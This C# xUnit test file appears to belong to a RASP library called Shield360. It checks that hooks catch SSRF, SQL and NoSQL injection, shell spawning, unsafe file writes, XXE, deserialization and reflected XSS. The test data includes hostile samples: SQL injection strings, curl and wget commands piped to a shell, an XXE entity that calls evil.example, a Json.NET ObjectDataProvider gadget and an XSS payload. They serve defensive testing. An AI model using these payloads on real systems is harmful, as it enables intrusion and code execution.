using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json.Nodes;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Features;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Data.Sqlite;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Http;
using Shield360.Rasp;
using Xunit;

namespace Shield360.Tests.Rasp;

/// <summary>
/// What each sink hook checks, beyond the shared contract (RaspHookKit): which calls,
/// which rule, once per call, and what it leaves alone. Ports of the TypeScript
/// http/db/process/fs/code hook tests for the .NET hooks.
/// </summary>
public class RaspHookTests : RaspStateTest
{
    private static RaspInput[] Inputs(params string[] values) => values.Select((v, i) => new RaspInput(v, "query.k" + i)).ToArray();

    private static T InRequest<T>(RaspInput[] inputs, Func<T> fn) => RaspScope.Run(new RaspContext(inputs, inRequest: true), fn);

    private static void InRequest(RaspInput[] inputs, Action fn) => InRequest(inputs, () =>
    {
        fn();
        return 0;
    });

    private static ListSink Mode(RaspMode mode, RaspAllowOptions? allow = null) => Configure(new EngineSettings(true, "hooks", mode, Allow: allow));

    private static string Rule(ListSink sink) => Assert.Single(sink.Events).Attrs["shield360.rasp.rule"];

    private sealed class OkHandler : HttpMessageHandler
    {
        public int Calls;

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            Calls++;
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        }
    }

    // ---- HTTP ----------------------------------------------------------------

    [Fact]
    public async Task Outbound_allow_list_applies_without_input_and_always_allows_the_Shield360_hosts()
    {
        var sink = Mode(RaspMode.Block, new RaspAllowOptions { OutboundHosts = { "*.example.com" } });
        RaspEngine.AlwaysAllowedHosts = new[] { "shield360.example.net" };
        var inner = new OkHandler();
        using var client = new HttpClient(new Shield360RaspHttpHandler(inner));

        await client.GetAsync(new Uri("https://api.example.com/v1"));
        await client.GetAsync(new Uri("https://shield360.example.net/api/guard/events"));
        var e = await Assert.ThrowsAsync<Shield360RaspBlockedException>(() => client.GetAsync(new Uri("https://elsewhere.test/")));
        Assert.Equal("outbound.not_allowed", e.Rule);
        Assert.Equal(2, inner.Calls);
        Assert.Equal("HttpClient.SendAsync", Assert.Single(sink.Events).Attrs["shield360.rasp.sink"]);
    }

    [Fact]
    public async Task A_request_seen_by_the_handler_and_the_diagnostic_event_is_checked_once()
    {
        var sink = Mode(RaspMode.Monitor);
        Assert.True(RaspDiagnosticHooks.Install());
        using var server = new TinyHttpServer();
        var url = $"http://127.0.0.1:{server.Port}/";
        using var client = new HttpClient(new Shield360RaspHttpHandler(new SocketsHttpHandler()));
        var response = await RaspScope.Run(new RaspContext(Inputs(url), inRequest: true), () => client.GetAsync(new Uri(url)));
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal("ssrf.internal", Rule(sink));
    }

    [Fact]
    public async Task The_connect_check_does_not_report_a_request_already_reported_before_sending()
    {
        var sink = Mode(RaspMode.Monitor);
        using var server = new TinyHttpServer();
        using var client = Shield360RaspHttp.CreateClient();
        var url = $"http://localhost:{server.Port}/";
        var response = await RaspScope.Run(new RaspContext(Inputs(url), inRequest: true), () => client.GetAsync(new Uri(url)));
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal("ssrf.internal", Rule(sink));
    }

    [Fact]
    public async Task Untainted_loopback_passes_and_a_public_name_resolving_publicly_passes()
    {
        var sink = Mode(RaspMode.Block);
        using var server = new TinyHttpServer();
        var previous = RaspHttpCheck.Resolve;
        RaspHttpCheck.Resolve = (_, _) => Task.FromResult(new[] { IPAddress.Loopback });
        try
        {
            using var client = Shield360RaspHttp.CreateClient();
            Assert.Equal(HttpStatusCode.OK, (await client.GetAsync(new Uri($"http://127.0.0.1:{server.Port}/"))).StatusCode);

            // Tainted by an unrelated input: not the host, so not SSRF.
            var response = await RaspScope.Run(new RaspContext(Inputs("orders"), inRequest: true), () => client.GetAsync(new Uri($"http://svc.test:{server.Port}/orders")));
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
            Assert.Empty(sink.Events);
        }
        finally
        {
            RaspHttpCheck.Resolve = previous;
        }
    }

    [Fact]
    public void The_connect_check_skips_a_connection_to_a_proxy()
    {
        var sink = Mode(RaspMode.Block);
        using var request = new HttpRequestMessage(HttpMethod.Get, "http://rebind.test/");
        InRequest(Inputs("rebind.test"), () => RaspHttpCheck.BeforeSend(request));
        RaspHttpCheck.BeforeConnect(request, "proxy.corp", new[] { IPAddress.Parse("10.0.0.8") });
        Assert.Empty(sink.Events);
        Assert.Throws<Shield360RaspBlockedException>(() => RaspHttpCheck.BeforeConnect(request, "rebind.test", new[] { IPAddress.Parse("10.0.0.8") }));
    }

    [Fact]
    public void IHttpClientFactory_clients_get_the_handler_and_the_connect_check()
    {
        var services = new ServiceCollection();
        services.AddShield360RaspHttpClients();
        services.AddHttpClient("orders");
        using var provider = services.BuildServiceProvider();
        var factory = provider.GetRequiredService<IHttpMessageHandlerFactory>();
        foreach (var name in new[] { "orders", Microsoft.Extensions.Options.Options.DefaultName })
        {
            var chain = new List<HttpMessageHandler>();
            for (HttpMessageHandler? h = factory.CreateHandler(name); h is not null; h = (h as DelegatingHandler)?.InnerHandler)
            {
                chain.Add(h);
            }

            Assert.Contains(chain, h => h is Shield360RaspHttpHandler);
            var primary = Assert.IsType<SocketsHttpHandler>(chain[^1]);
            Assert.NotNull(primary.ConnectCallback);
        }
    }

    [Fact]
    public void UseConnectCheck_leaves_a_handler_with_its_own_callback_alone()
    {
        using var handler = new SocketsHttpHandler { ConnectCallback = (_, _) => throw new NotSupportedException() };
        var own = handler.ConnectCallback;
        Assert.False(Shield360RaspHttp.UseConnectCheck(handler));
        Assert.Same(own, handler.ConnectCallback);
    }

    // ---- SQL and NoSQL ----------------------------------------------------------------

    [Fact]
    public void Parameterized_and_unrelated_SQL_passes()
    {
        var sink = Mode(RaspMode.Block);
        InRequest(Inputs("x' OR '1'='1", "alice"), () =>
        {
            Shield360Rasp.CheckSql("SELECT * FROM users WHERE name = @name", RaspSqlDialect.MsSql);
            Shield360Rasp.CheckSql("SELECT * FROM users WHERE name = 'alice'", RaspSqlDialect.MsSql);
        });
        Assert.Empty(sink.Events);
    }

    [Fact]
    public void A_command_checked_by_EF_Core_is_not_checked_again_by_the_SqlClient_event()
    {
        var sink = Mode(RaspMode.Monitor);
        Assert.True(RaspDiagnosticHooks.Install());
        using var listener = new DiagnosticListener(RaspDiagnosticHooks.SqlListener);
        using var command = new SqliteCommand("SELECT * FROM t WHERE a = 'x' OR '1'='1'");
        InRequest(Inputs("x' OR '1'='1"), () =>
        {
            RaspSql.CheckCommand("efcore.ExecuteReader", command, RaspSqlDialect.Sqlite);
            listener.Write(RaspDiagnosticHooks.SystemSqlBefore, new { Command = command });
            Assert.Single(sink.Events);

            // The mark is used once: the next execution is checked again.
            listener.Write(RaspDiagnosticHooks.SystemSqlBefore, new { Command = command });
        });
        Assert.Equal(new[] { "efcore.ExecuteReader", "System.Data.SqlClient.SqlCommand" }, sink.Events.Select(e => e.Attrs["shield360.rasp.sink"]));
    }

    [Fact]
    public void Stored_procedures_are_not_lexed_as_SQL()
    {
        var sink = Mode(RaspMode.Block);
        using var command = new Microsoft.Data.SqlClient.SqlCommand("x' OR '1'='1") { CommandType = CommandType.StoredProcedure };
        InRequest(Inputs("x' OR '1'='1"), () => RaspSql.CheckCommand("db", command, RaspSqlDialect.Generic));
        Assert.Empty(sink.Events);
    }

    [Fact]
    public void Microsoft_Data_SqlClient_commands_are_reported_under_their_driver()
    {
        var sink = Mode(RaspMode.Monitor);
        Assert.True(RaspDiagnosticHooks.Install());
        InRequest(Inputs("x' OR '1'='1"), () =>
        {
            using var connection = new Microsoft.Data.SqlClient.SqlConnection("Server=127.0.0.1,9;Encrypt=false;Connect Timeout=1");
            using var command = new Microsoft.Data.SqlClient.SqlCommand("SELECT 1 WHERE 'x' OR '1'='1' = 'x' OR '1'='1'", connection);
            Assert.Throws<InvalidOperationException>(() => command.ExecuteNonQuery());
        });
        var e = Assert.Single(sink.Events);
        Assert.Equal("Microsoft.Data.SqlClient.SqlCommand", e.Attrs["shield360.rasp.sink"]);
    }

    [Theory]
    [InlineData("Microsoft.EntityFrameworkCore.SqlServer", RaspSqlDialect.MsSql)]
    [InlineData("Npgsql.EntityFrameworkCore.PostgreSQL", RaspSqlDialect.Postgres)]
    [InlineData("Pomelo.EntityFrameworkCore.MySql", RaspSqlDialect.MySql)]
    [InlineData("Microsoft.EntityFrameworkCore.Sqlite", RaspSqlDialect.Sqlite)]
    [InlineData("Oracle.EntityFrameworkCore", RaspSqlDialect.Oracle)]
    public void The_dialect_comes_from_the_provider(string provider, RaspSqlDialect dialect) =>
        Assert.Equal(dialect, RaspSql.DialectOf(provider));

    private sealed class FakeBsonDocument
    {
        private readonly Dictionary<string, object> _values;

        public FakeBsonDocument(Dictionary<string, object> values)
        {
            _values = values;
        }

        public Dictionary<string, object> ToDictionary() => _values;
    }

    [Fact]
    public void Mongo_documents_from_dictionaries_and_ToDictionary_objects_are_checked_stage_by_stage()
    {
        var sink = Mode(RaspMode.Monitor);
        var ctx = new RaspContext(Inputs("admin"), inRequest: true);
        ctx.Mutate((_, trees) => trees.Add(JsonNode.Parse("""{"user":{"$gt":""}}""")));
        RaspScope.Run(ctx, () =>
        {
            Shield360Rasp.CheckMongo(new Dictionary<string, object?> { ["user"] = "admin" });
            Shield360Rasp.CheckMongo("""{"user":{"$gt":"a"}}""");
            Assert.Empty(sink.Events);
            var stage = new FakeBsonDocument(new Dictionary<string, object> { ["$match"] = new Dictionary<string, object> { ["user"] = new Dictionary<string, object> { ["$gt"] = "" } } });
            Shield360Rasp.CheckMongo("mongodb.aggregate", new object?[] { new object[] { new Dictionary<string, object> { ["$limit"] = 1 }, stage } });
            return 0;
        });
        Assert.Equal("nosqli.operator", Rule(sink));
    }

    // ---- Process ----------------------------------------------------------------

    [Fact]
    public void Arguments_split_as_the_runtime_splits_them()
    {
        Assert.Equal(new[] { "-c", "echo a b", "x\"y" }, RaspProcess.SplitArguments("-c \"echo a b\"  x\\\"y"));
        var info = new ProcessStartInfo("sh");
        info.ArgumentList.Add("-c");
        info.ArgumentList.Add("ls; id");
        Assert.Equal(new[] { "sh", "-c", "ls; id" }, RaspProcess.ArgvOf(info));
    }

    [Fact]
    public void A_shell_started_during_a_request_is_flagged_unless_allowed()
    {
        var sink = Mode(RaspMode.Block);
        InRequest(Inputs("orders"), () =>
            Assert.Equal("shell_spawn.shell", Assert.Throws<Shield360RaspBlockedException>(() => Shield360Rasp.CheckProcess(new ProcessStartInfo("/bin/bash", "build.sh"))).Rule));
        Shield360Rasp.CheckProcess(new ProcessStartInfo("/bin/bash", "build.sh"));
        Mode(RaspMode.Block, new RaspAllowOptions { Commands = { "bash" } });
        InRequest(Inputs("orders"), () => Shield360Rasp.CheckProcess(new ProcessStartInfo("/bin/bash", "build.sh")));
        Assert.Single(sink.Events);
    }

    [Fact]
    public void A_download_piped_to_a_shell_is_flagged_at_any_time_and_an_executable_from_input_in_a_request()
    {
        Mode(RaspMode.Block);
        Assert.Equal("shell_spawn.download_exec", Assert.Throws<Shield360RaspBlockedException>(() => Shield360Rasp.CheckCommand("curl -s https://x.test/i | sh")).Rule);
        Assert.Equal("shell_spawn.download_exec", Assert.Throws<Shield360RaspBlockedException>(() => Shield360Rasp.CheckProcess(new ProcessStartInfo("sh", "-c \"wget -O- https://x.test | bash\""))).Rule);
        InRequest(Inputs("/usr/bin/convert-evil"), () =>
            Assert.Equal("cmdi.executable", Assert.Throws<Shield360RaspBlockedException>(() => Shield360Rasp.CheckProcess(new ProcessStartInfo("/usr/bin/convert-evil"))).Rule));
        InRequest(Inputs("report.pdf"), () => Shield360Rasp.CheckProcess(new ProcessStartInfo("/usr/bin/convert", "report.pdf out.png")));
    }

    // ---- Files ----------------------------------------------------------------

    [Fact]
    public void File_checks_cover_streams_roots_scripts_and_both_paths_of_a_move()
    {
        var root = Path.Combine(Path.GetTempPath(), "shield360-hooks-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            var sink = Mode(RaspMode.Block, new RaspAllowOptions { FileRoots = { root } });
            Assert.Equal("file_write.ntfs", Assert.Throws<Shield360RaspBlockedException>(() => RaspFile.WriteAllText(Path.Combine(root, "a.txt::$DATA"), "x")).Rule);
            InRequest(Inputs("report.txt", "shell.php"), () =>
            {
                RaspFile.WriteAllText(Path.Combine(root, "report.txt"), "ok");
                Assert.Equal("ok", RaspFile.ReadAllText(Path.Combine(root, "report.txt")));
                Assert.Single(RaspDirectory.GetFiles(root));
                Assert.Equal("path.outside_root", Assert.Throws<Shield360RaspBlockedException>(() => RaspFile.ReadAllText("/var/report.txt")).Rule);
                Assert.Equal("file_write.script", Assert.Throws<Shield360RaspBlockedException>(() => RaspFile.WriteAllText(Path.Combine(root, "shell.php"), "<?php")).Rule);
                Assert.Throws<Shield360RaspBlockedException>(() => RaspFile.Move(Path.Combine(root, "report.txt"), "/srv/report.txt"));
            });
            Assert.True(File.Exists(Path.Combine(root, "report.txt")));
            Assert.False(File.Exists(Path.Combine(root, "shell.php")));
            Assert.Equal(4, sink.Events.Count);
        }
        finally
        {
            Directory.Delete(root, recursive: true);
        }
    }

    // ---- XML, deserialization, code ----------------------------------------------------------------

    [Fact]
    public void XML_settings_decide_between_external_entity_and_doctype()
    {
        Assert.False(RaspCodeSinks.ResolvesExternal((XmlReaderSettings?)null));
        Assert.False(RaspCodeSinks.ResolvesExternal(new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse }));
        Assert.False(RaspCodeSinks.ResolvesExternal(new XmlReaderSettings { XmlResolver = new XmlUrlResolver() }));
        Assert.True(RaspCodeSinks.ResolvesExternal(new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse, XmlResolver = new XmlUrlResolver() }));
        Assert.False(RaspCodeSinks.ResolvesExternal(new XmlDocument()));

        var sink = Mode(RaspMode.Monitor);
        const string xml = "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://evil.example/x\">]><r>&x;</r>";
        InRequest(Inputs(xml), () =>
        {
            Shield360Rasp.CheckXml(xml, new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse });
            RaspXml.LoadXml(new XmlDocument(), "<r>plain</r>");
        });
        Assert.Equal("xxe.doctype", Rule(sink));
    }

    private enum TypeNameHandling
    {
        None = 0,
        Auto = 4,
    }

    private sealed class FakeJsonSettings
    {
        public TypeNameHandling TypeNameHandling { get; set; }
    }

    [Fact]
    public void JSON_is_checked_for_type_names_only_when_the_settings_honor_them()
    {
        var sink = Mode(RaspMode.Monitor);
        const string json = """{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}""";
        InRequest(Inputs(json), () =>
        {
            Shield360Rasp.CheckJson(json, new FakeJsonSettings { TypeNameHandling = TypeNameHandling.None });
            Assert.Empty(sink.Events);
            Shield360Rasp.CheckJson(json, new FakeJsonSettings { TypeNameHandling = TypeNameHandling.Auto });
        });
        Assert.Equal("deser.typename", Rule(sink));
    }

    [Fact]
    public void A_seekable_stream_is_checked_and_put_back_where_it_was()
    {
        var sink = Mode(RaspMode.Monitor);
        var payload = Encoding.Latin1.GetBytes("AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0=");
        using var stream = new MemoryStream(payload);
        InRequest(Inputs(Convert.ToBase64String(payload)), () => Shield360Rasp.CheckDeserialization(RaspDeserializer.LosFormatter, stream));
        Assert.Equal(0, stream.Position);
        var e = Assert.Single(sink.Events);
        Assert.Equal("deser.binaryformatter", e.Attrs["shield360.rasp.rule"]);
        Assert.Equal("LosFormatter.Deserialize", e.Attrs["shield360.rasp.sink"]);
    }

    [Fact]
    public void Code_without_tainted_structure_passes()
    {
        var sink = Mode(RaspMode.Block);
        InRequest(Inputs("alice", "x); fetch(1"), () => Shield360Rasp.CheckCode("return greet('alice');"));
        Assert.Empty(sink.Events);
    }

    // ---- XSS (ASP.NET Core) ----------------------------------------------------------------

    private static async Task<WebApplication> Serve(Action<WebApplication> map)
    {
        var builder = WebApplication.CreateBuilder();
        builder.WebHost.UseTestServer();
        var app = builder.Build();
        app.UseShield360Rasp();
        map(app);
        await app.StartAsync();
        return app;
    }

    [Fact]
    public async Task Reflected_input_in_HTML_is_reported_once_and_the_response_is_unchanged()
    {
        var sink = Mode(RaspMode.Block);
        await using var app = await Serve(a =>
        {
            a.MapGet("/html", async (HttpContext c) =>
            {
                c.Response.ContentType = "text/html";
                await c.Response.BodyWriter.WriteAsync(Encoding.UTF8.GetBytes("<div>"));
                await c.Response.Body.WriteAsync(Encoding.UTF8.GetBytes(c.Request.Query["q"].ToString()));
                await c.Response.WriteAsync("</div>");
            });
            a.MapGet("/json", (string q) => Results.Text(q, "application/json"));
            a.MapGet("/safe", () => Results.Content("<p>hello</p>", "text/html"));
        });
        var client = app.GetTestClient();
        const string payload = "<img src=x onerror=alert(1)>";
        var q = "?q=" + Uri.EscapeDataString(payload);
        Assert.Equal("<div>" + payload + "</div>", await client.GetStringAsync(new Uri("/html" + q, UriKind.Relative)));
        Assert.Equal(payload, await client.GetStringAsync(new Uri("/json" + q, UriKind.Relative)));
        Assert.Equal("<p>hello</p>", await client.GetStringAsync(new Uri("/safe" + q, UriKind.Relative)));
        var e = Assert.Single(sink.Events);
        Assert.Equal("xss.reflected", e.Attrs["shield360.rasp.rule"]);
        Assert.Equal("monitored", e.Attrs["shield360.rasp.decision"]);
        Assert.Equal("http.response", e.Attrs["shield360.rasp.sink"]);
        Assert.Equal("/html", e.Attrs["shield360.rasp.route"]);
    }

    // ---- Runtime ----------------------------------------------------------------

    [Fact]
    public void Start_installs_the_process_hooks_and_shutdown_removes_them()
    {
        Assert.True(RaspRuntime.Start(new RaspOptions(), new RaspStartContext("hooks", Env: Env.Empty)));
        Assert.True(RaspDiagnosticHooks.Installed);
        RaspRuntime.Shutdown();
        Assert.False(RaspDiagnosticHooks.Installed);

        Assert.True(RaspRuntime.Start(new RaspOptions { Hooks = false }, new RaspStartContext("hooks", Env: Env.Empty)));
        Assert.False(RaspDiagnosticHooks.Installed);
        Assert.False(RaspRuntime.Start(new RaspOptions { Enabled = false }, new RaspStartContext("hooks", Env: Env.Empty)));
        Assert.False(RaspDiagnosticHooks.Installed);
    }
}
